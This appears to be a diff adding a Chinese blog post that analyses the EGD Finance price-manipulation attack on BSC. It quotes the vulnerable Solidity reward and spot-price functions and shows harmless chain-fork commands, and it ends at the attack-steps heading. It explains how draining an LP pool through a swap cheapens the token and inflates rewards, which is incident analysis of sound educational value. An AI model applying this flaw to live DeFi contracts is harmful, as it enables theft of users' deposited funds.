@@ -1,0 +1,1466 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>EGD Finance 价格操纵攻击事件分析 - YINHUI&#39;s BLOG</title><meta name="Description" content="银辉的博客"><meta property="og:title" content="EGD Finance 价格操纵攻击事件分析" />
+<meta property="og:description" content="背景介绍 攻击事件发生在 https://bscscan.com/tx/0x50da0b1b6e34bce59769157df769eb45fa11efc7d0e292900d6b0a86ae66a2b3 攻击者调用攻击合约对 EGD_Finance 进行了价格操纵攻击, 进而套现了不少USDT. 可以在这里看到攻击流程: https://phalcon.blocksec.com/tx/bsc/0x50da0b1b6e34bce59769157df769eb45fa11efc7d0e292900d6b0a86ae66a2b3 另外一篇关于该攻击的逆向" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://yinhui1984.github.io/analyse_of_egd_finance_attack/" /><meta property="og:image" content="https://yinhui1984.github.io/avatar.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-03-06T15:09:31+08:00" />
+<meta property="article:modified_time" content="2023-03-06T15:09:31+08:00" /><meta property="og:site_name" content="YINHUI&#39;s BLOG" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://yinhui1984.github.io/avatar.png"/>
+
+<meta name="twitter:title" content="EGD Finance 价格操纵攻击事件分析"/>
+<meta name="twitter:description" content="背景介绍 攻击事件发生在 https://bscscan.com/tx/0x50da0b1b6e34bce59769157df769eb45fa11efc7d0e292900d6b0a86ae66a2b3 攻击者调用攻击合约对 EGD_Finance 进行了价格操纵攻击, 进而套现了不少USDT. 可以在这里看到攻击流程: https://phalcon.blocksec.com/tx/bsc/0x50da0b1b6e34bce59769157df769eb45fa11efc7d0e292900d6b0a86ae66a2b3 另外一篇关于该攻击的逆向"/>
+<meta name="application-name" content="YINHUI&#39;s BLOG">
+<meta name="apple-mobile-web-app-title" content="YINHUI&#39;s BLOG"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://yinhui1984.github.io/analyse_of_egd_finance_attack/" /><link rel="prev" href="https://yinhui1984.github.io/evm-puzzles/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "EGD Finance 价格操纵攻击事件分析",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/yinhui1984.github.io\/analyse_of_egd_finance_attack\/"
+        },"genre": "posts","keywords": "defi","wordcount":  4104 ,
+        "url": "https:\/\/yinhui1984.github.io\/analyse_of_egd_finance_attack\/","datePublished": "2023-03-06T15:09:31+08:00","dateModified": "2023-03-06T15:09:31+08:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "yinhui"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="YINHUI&#39;s BLOG"></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 文章 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/"> 首页 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="YINHUI&#39;s BLOG"></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">文章</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/" title="">首页</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content always-active" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">EGD Finance 价格操纵攻击事件分析</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://github.com/yinhui1984" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>yinhui</a></span>&nbsp;<span class="post-category">included in <a href="/categories/security/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>security</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2023-03-06">2023-03-06</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;4104 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;9 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#背景介绍">背景介绍</a></li>
+    <li><a href="#code-review">Code Review</a>
+      <ul>
+        <li><a href="#逻辑合约">逻辑合约</a></li>
+        <li><a href="#漏洞代码">漏洞代码</a></li>
+      </ul>
+    </li>
+    <li><a href="#攻击过程">攻击过程</a>
+      <ul>
+        <li><a href="#操纵edgusdt的价格-让edg非常便宜">操纵EDG/USDT的价格, 让EDG非常便宜</a></li>
+        <li><a href="#质押usdt获取edg奖励">质押USDT获取EDG奖励</a></li>
+        <li><a href="#在操纵价格后获取edg奖励">在操纵价格后获取EDG奖励</a></li>
+        <li><a href="#将获利兑换为usdt进行套现">将获利兑换为USDT进行套现</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h2 id="背景介绍">背景介绍</h2>
+<p>攻击事件发生在 <a href="https://bscscan.com/tx/0x50da0b1b6e34bce59769157df769eb45fa11efc7d0e292900d6b0a86ae66a2b3" target="_blank" rel="noopener noreffer ">https://bscscan.com/tx/0x50da0b1b6e34bce59769157df769eb45fa11efc7d0e292900d6b0a86ae66a2b3</a></p>
+<p><a href="https://bscscan.com/address/0xee0221d76504aec40f63ad7e36855eebf5ea5edd" target="_blank" rel="noopener noreffer ">攻击者</a>调用<a href="https://bscscan.com/address/0xc30808d9373093fbfcec9e026457c6a9dab706a7" target="_blank" rel="noopener noreffer ">攻击合约</a>对 <a href="https://bscscan.com/address/0x93c175439726797dcee24d08e4ac9164e88e7aee#code" target="_blank" rel="noopener noreffer ">EGD_Finance</a>  进行了价格操纵攻击, 进而套现了不少USDT.</p>
+<p>可以在这里看到攻击流程:  <a href="https://phalcon.blocksec.com/tx/bsc/0x50da0b1b6e34bce59769157df769eb45fa11efc7d0e292900d6b0a86ae66a2b3" target="_blank" rel="noopener noreffer ">https://phalcon.blocksec.com/tx/bsc/0x50da0b1b6e34bce59769157df769eb45fa11efc7d0e292900d6b0a86ae66a2b3</a></p>
+<p>另外一篇关于该攻击的逆向分析教程在这里: <a href="https://github.com/SunWeb3Sec/DeFiHackLabs/tree/main/academy/onchain_debug/03_write_your_own_poc#%e6%89%8b%e6%8a%8a%e6%89%8b%e6%92%b0%e5%af%ab-poc---%e4%bb%a5-egd-finance-%e7%82%ba%e4%be%8b" target="_blank" rel="noopener noreffer ">https://github.com/SunWeb3Sec/DeFiHackLabs/tree/main/academy/onchain_debug/03_write_your_own_poc#手把手撰寫-poc&mdash;以-egd-finance-為例</a></p>
+<p>我这里从正向的角度, 一步步来回放本次攻击.</p>
+<h2 id="code-review">Code Review</h2>
+<h3 id="逻辑合约">逻辑合约</h3>
+<p>EGD_Finance 在 这里代理合约位置 : <a href="https://bscscan.com/address/0x34Bd6Dba456Bc31c2b3393e499fa10bED32a9370#code" target="_blank" rel="noopener noreffer ">https://bscscan.com/address/0x34Bd6Dba456Bc31c2b3393e499fa10bED32a9370#code</a></p>
+<p>通过点击区块链浏览器上的&quot;Read as Proxy&quot; 按钮可以得到其逻辑合约为 &quot; <a href="https://bscscan.com/address/0x93c175439726797dcee24d08e4ac9164e88e7aee#code" target="_blank" rel="noopener noreffer ">0x93c175439726797dcee24d08e4ac9164e88e7aee</a>&quot;</p>
+<p>或者通过读取代理合约的<code>_IMPLEMENTATION_SLOT</code> 也可以得到当前使用的逻辑合约地址</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>在逻辑合约 <code>EGD_Finance</code>中我们可以看到其实现了一个&quot;质押USDT奖励EGD token&quot;的功能.</p>
+<p>基本流程是</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">用户A填写邀请人用户B : function bond(address invitor) external: 
+</span></span><span class="line"><span class="cl">用户A将一定数量的USDT质押给EGD_Finance: function stake(uint amount) external
+</span></span><span class="line"><span class="cl">经过一段时间后
+</span></span><span class="line"><span class="cl">用户A要求领取质押奖励: function claimAllReward() external
+</span></span><span class="line"><span class="cl">EGD_Finance根据用户质押数量, 质押时长, 当前EGD token的价格等因素, 将奖励发放给用户A
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nf">claimAllReward</span><span class="p">()</span> <span class="k">external</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">				 <span class="c1">// 判断是否有质押
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nb">require</span><span class="p">(</span><span class="n">userInfo</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">].</span><span class="n">userStakeList</span><span class="p">.</span><span class="n">length</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">,</span> <span class="s">&#39;no stake&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// 判断是否在黑名单
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nb">require</span><span class="p">(</span><span class="o">!</span><span class="n">black</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">],</span><span class="s">&#39;black&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint</span><span class="p">[]</span> <span class="k">storage</span> <span class="n">list</span> <span class="o">=</span> <span class="n">userInfo</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">].</span><span class="n">userStakeList</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint</span> <span class="n">rew</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint</span> <span class="n">outAmount</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint</span> <span class="n">range</span> <span class="o">=</span> <span class="n">list</span><span class="p">.</span><span class="n">length</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">//计算奖励数量
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">for</span> <span class="p">(</span><span class="kt">uint</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">range</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">UserSlot</span> <span class="k">storage</span> <span class="n">info</span> <span class="o">=</span> <span class="n">userSlot</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">][</span><span class="n">list</span><span class="p">[</span><span class="n">i</span> <span class="o">-</span> <span class="n">outAmount</span><span class="p">]];</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">require</span><span class="p">(</span><span class="n">info</span><span class="p">.</span><span class="n">totalQuota</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">,</span> <span class="s">&#39;wrong index&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="kt">uint</span> <span class="n">quota</span> <span class="o">=</span> <span class="p">(</span><span class="nb">block</span><span class="p">.</span><span class="nb">timestamp</span> <span class="o">-</span> <span class="n">info</span><span class="p">.</span><span class="n">claimTime</span><span class="p">)</span> <span class="o">*</span> <span class="n">info</span><span class="p">.</span><span class="n">rates</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="n">quota</span> <span class="o">&gt;=</span> <span class="n">info</span><span class="p">.</span><span class="n">leftQuota</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="n">quota</span> <span class="o">=</span> <span class="n">info</span><span class="p">.</span><span class="n">leftQuota</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="c1">//获取当前EGD的价格,并确定发放EDG数量
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="c1">//EGD越便宜, 获得的EGD数量就越多
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">rew</span> <span class="o">+=</span> <span class="n">quota</span> <span class="o">*</span> <span class="mi">1</span><span class="n">e18</span> <span class="o">/</span> <span class="n">getEGDPrice</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">            <span class="n">info</span><span class="p">.</span><span class="n">claimTime</span> <span class="o">=</span> <span class="nb">block</span><span class="p">.</span><span class="nb">timestamp</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="n">info</span><span class="p">.</span><span class="n">leftQuota</span> <span class="o">-=</span> <span class="n">quota</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="n">info</span><span class="p">.</span><span class="n">claimedQuota</span> <span class="o">+=</span> <span class="n">quota</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="n">info</span><span class="p">.</span><span class="n">leftQuota</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="n">userInfo</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">].</span><span class="n">totalAmount</span> <span class="o">-=</span> <span class="n">info</span><span class="p">.</span><span class="n">totalQuota</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                <span class="k">delete</span> <span class="n">userSlot</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">][</span><span class="n">list</span><span class="p">[</span><span class="n">i</span> <span class="o">-</span> <span class="n">outAmount</span><span class="p">]];</span>
+</span></span><span class="line"><span class="cl">                <span class="n">list</span><span class="p">[</span><span class="n">i</span> <span class="o">-</span> <span class="n">outAmount</span><span class="p">]</span> <span class="o">=</span> <span class="n">list</span><span class="p">[</span><span class="n">list</span><span class="p">.</span><span class="n">length</span> <span class="o">-</span> <span class="mi">1</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">                <span class="n">list</span><span class="p">.</span><span class="n">pop</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">                <span class="n">outAmount</span> <span class="o">++</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">//更新质押列表
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">userInfo</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">].</span><span class="n">userStakeList</span> <span class="o">=</span> <span class="n">list</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">//发送奖励
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">EGD</span><span class="p">.</span><span class="nb">transfer</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="n">rew</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">userInfo</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">].</span><span class="n">totalClaimed</span> <span class="o">+=</span> <span class="n">rew</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">emit</span> <span class="n">Claim</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span><span class="n">rew</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="漏洞代码">漏洞代码</h3>
+<p>采用了如下函数计算EGD token价格</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">getEGDPrice</span><span class="p">()</span> <span class="k">public</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint</span> <span class="n">balance1</span> <span class="o">=</span> <span class="n">EGD</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="n">pair</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint</span> <span class="n">balance2</span> <span class="o">=</span> <span class="n">U</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="n">pair</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">(</span><span class="n">balance2</span> <span class="o">*</span> <span class="mi">1</span><span class="n">e18</span> <span class="o">/</span> <span class="n">balance1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>其中 <code>address public pair</code>是在初始化函数中赋值的:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">initialize</span><span class="p">()</span> <span class="k">public</span> <span class="n">initializer</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">__Context_init_unchained</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">__Ownable_init_unchained</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">rate</span> <span class="o">=</span> <span class="p">[</span><span class="mi">200</span><span class="p">,</span> <span class="mi">180</span><span class="p">,</span> <span class="mi">160</span><span class="p">,</span> <span class="mi">140</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">        <span class="n">startTime</span> <span class="o">=</span> <span class="nb">block</span><span class="p">.</span><span class="nb">timestamp</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">referRate</span> <span class="o">=</span> <span class="p">[</span><span class="mi">6</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">        <span class="n">rateList</span> <span class="o">=</span> <span class="p">[</span><span class="mi">547</span><span class="p">,</span><span class="mi">493</span><span class="p">,</span><span class="mi">438</span><span class="p">,</span><span class="mi">383</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">        <span class="n">dailyStakeLimit</span> <span class="o">=</span> <span class="mi">1000000</span> <span class="kc">ether</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">wallet</span> <span class="o">=</span> <span class="mh">0xC8D45fF624F698FA4E745F02518f451ec4549AE8</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">fund</span> <span class="o">=</span> <span class="mh">0x9Ce3Aded1422A8c507DC64Ce1a0C759cf7A4289F</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">EGD</span> <span class="o">=</span> <span class="n">IERC20</span><span class="p">(</span><span class="mh">0x202b233735bF743FA31abb8f71e641970161bF98</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">U</span> <span class="o">=</span> <span class="n">IERC20</span><span class="p">(</span><span class="mh">0x55d398326f99059fF775485246999027B3197955</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">router</span> <span class="o">=</span> <span class="n">IPancakeRouter02</span><span class="p">(</span><span class="mh">0x10ED43C718714eb63d5aA57B78B54704E256024E</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">pair</span> <span class="o">=</span> <span class="n">IPancakeFactory</span><span class="p">(</span><span class="n">router</span><span class="p">.</span><span class="n">factory</span><span class="p">()).</span><span class="n">getPair</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">EGD</span><span class="p">),</span><span class="kt">address</span><span class="p">(</span><span class="n">U</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>可以在 <a href="https://bscscan.com/address/0x34Bd6Dba456Bc31c2b3393e499fa10bED32a9370#readProxyContract" target="_blank" rel="noopener noreffer ">代理合约</a> 的 Read as Proxy 中点击 pair得到, 其值为 <code>0xa361433E409Adac1f87CDF133127585F8a93c67d</code></p>
+<p>或者通过 下面的命令行得到</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"> &gt; anvil -f https://rpc.ankr.com/bsc   --fork-block-number 20245522
+</span></span><span class="line"><span class="cl"> &gt; cast call 0x34Bd6Dba456Bc31c2b3393e499fa10bED32a9370 &#34;pair()&#34;
+</span></span><span class="line"><span class="cl"> //0x000000000000000000000000a361433e409adac1f87cdf133127585f8a93c67d
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>在区块链浏览器中可以看到该地址是<a href="https://bscscan.com/token/0xa361433e409adac1f87cdf133127585f8a93c67d" target="_blank" rel="noopener noreffer ">Pancake LPs (Cake-LP)</a>  (Pancake流动性提供商)</p>
+<p>也就是说 <code>getEGDPrice()</code>是根据地址0xa361433E409Adac1f87CDF133127585F8a93c67d上的EGD token数量和USDT的数量 (也就是流动性)进行价格计算的.</p>
+<p>当USDT数量远远多于EDG数量时, EDG就能兑换更多的USDT, 也就是EDG更昂贵</p>
+<p>相反, 当USDT数量很少时, EDG就兑换更少的USDT, 也就是EDG更便宜.</p>
+<p>但我们知道在该<a href="https://bscscan.com/address/0xa361433e409adac1f87cdf133127585f8a93c67d#code" target="_blank" rel="noopener noreffer ">Pancke Swap LPs</a> 提供了<code>swap</code>函数进行借贷操作,  我们可以大量借出USDT, 让EDG变得非常便宜, 那么根据下面的代码, 用户获得的用于奖励的EDG的数量就非常多.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">//获取当前EGD的价格,并确定发放EDG数量
+</span></span></span><span class="line"><span class="cl"><span class="c1">//EGD越便宜, 获得的EGD数量就越多
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">rew</span> <span class="o">+=</span> <span class="n">quota</span> <span class="o">*</span> <span class="mi">1</span><span class="n">e18</span> <span class="o">/</span> <span class="n">getEGDPrice</span><span class="p">();</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="攻击过程">攻击过程</h2>
